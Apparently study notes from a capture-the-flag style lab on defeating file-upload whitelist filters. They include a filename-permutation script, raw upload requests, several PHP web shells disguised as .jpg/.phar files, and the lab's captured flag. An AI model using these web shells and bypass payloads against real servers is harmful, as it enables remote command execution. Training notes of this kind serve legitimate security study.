# Whitelist Filters

A whitelist is generally more secure than a blacklist.

A whitelist is usually only used with upload functionalities where only a few file types are allowed.

Both blacklists and whitelists may also be used in tandem.

## Double Extensions

Example of code :

$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}

http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id


--> Will not work if applications use regex pattern like this :
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }

## Reverse Double Extension

In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability.

Example of vulnerable Apache conf :
/etc/apache2/mods-enabled/php7.4.conf

<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>

it will execute as php a file named : shell.php.jpg

## Character Injection

The following are some of the characters we may try injecting:

%20
%0a
%00
%0d0a
/
.\
.
…
:

(shell.php%00.jpg) works with PHP servers with version 5.X or earlier
on a Windows (shell.aspx:.jpg) which should also write the file as (shell.aspx)

Bash script to generate all permutations :

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$ext.jpg" >> wordlist.txt
        echo "shell.jpg$ext" >> wordlist.txt
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done


## LAB

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$ext.jpg" >> wordlist.txt
        echo "shell.jpg$ext" >> wordlist.txt
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

echo "<?php system($_GET['cmd']); ?>" > shell.php

POST /upload.php HTTP/1.1
Host: 94.237.56.188:42819
Content-Length: 215
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RFhDsJuZgAc5CBt
Origin: http://94.237.56.188:42819
Referer: http://94.237.56.188:42819/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundary0RFhDsJuZgAc5CBt
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg"
Content-Type: image/jpeg

<?php system(['cmd']); ?>

------WebKitFormBoundary0RFhDsJuZgAc5CBt--

Send to Intruder
Options : wordlist.txt

Content-Disposition: form-data; name="uploadFile"; filename="§shell.jpg§"
Content-Type: image/jpeg

<?php system(['cmd']); ?>

------WebKitFormBoundary0RFhDsJuZgAc5CBt--


Length : 193 so it is accepted as jpg file

Payload:	shell.php/.jpg
Payload:	shell.php.\\.jpg
Payload:	shell.phps.\\.jpg

http://94.237.56.188:42819/profile_images/shell.phps.//.jpg

--> Not Found

Payload:	shell.phps/.jpg

http://94.237.56.188:42819/profile_images/shell.phps/.jpg

--> Forbidden

echo "<?php system($_GET['cmd']); ?>" > shell.php/.jpg

echo "<?php system($_GET['cmd']); ?>" > shell.php.jpg

echo "<?php system($_GET['cmd']); ?>" > shell.phar.jpg

echo "<?php system($_GET['cmd']); ?>" > shell2.phar\x00.jpg

echo "<?php echo("test");system($_GET['cmd']); ?>" > shell3.phar.jpg
test

echo "<?php echo("test");echo($_GET['cmd']);system($_GET['cmd']); ?>" > shell4.phar.jpg
testArray

echo "<?php echo("test");echo($_REQUEST['cmd']);system($_REQUEST['cmd']); ?>" > shell5.phar.jpg
testArray

echo "<?php echo("test");echo($_REQUEST['cmd'][0]);system($_REQUEST['cmd'][0]); ?>" > shell6.phar.jpg
testcmd

echo "<?php system('cat /flag.txt'); ?>" > shell7.phar.jpg
HTB{1_wh173l157_my53lf}